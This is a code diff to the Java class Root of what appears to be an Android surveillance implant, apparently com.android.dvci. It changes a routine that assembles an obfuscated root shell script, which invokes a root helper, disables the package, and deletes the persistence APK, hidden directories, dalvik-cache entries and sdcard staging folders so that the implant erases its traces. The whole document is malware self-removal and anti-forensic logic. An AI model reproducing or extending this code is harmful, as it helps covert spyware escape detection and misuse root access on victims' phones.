@@ -312,21 +312,9 @@ public class Root {
 			//script += M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
 			String script = "";
-			if (new AutoFile(Path.hidden()).exists()) {
-				script += M.e("rm -r ") + Path.hidden() + "\n";
-			}
 			script += Configuration.shellFile + M.e(" blw") + "\n";
-			/* we need to remove also /data/data/pkgName ? */
-			if (Status.getAppDir() != null) {
-				if (new AutoFile(Status.getAppDir()).exists()) {
-					script += M.e("rm -r ") + Status.getAppDir() + "\n";
-				}
-			}
 
-			// TODO: mettere Status.persistencyApk e packageName
-			script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
-			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
-			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+
 
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
@@ -340,10 +328,23 @@ public class Root {
 				 */
 
 			// the
+
 			script += String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), Status.persistencyApk, Status.persistencyApk) + "\n";
+			if(!Status.isPersistent()){
+				script += M.e("sleep 5\n");
+			}
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/1"), M.e("/sdcard/1")) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/2"), M.e("/sdcard/2")) + "\n";
+			//if(Status.isPersistent()){
+				script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Status.getAppDir(), Status.getAppDir()) + "\n";
+				script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Path.hidden(), Path.hidden()) + "\n";
+				// TODO: mettere Status.persistencyApk e packageName
+				script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			//}
+			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+
 			script += Configuration.shellFile + M.e(" blr") + "\n";
 			script += Configuration.shellFile + M.e(" ru") + "\n";
 			script += M.e("sleep 1; ") + String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), apkPath, apkPath) + "\n";
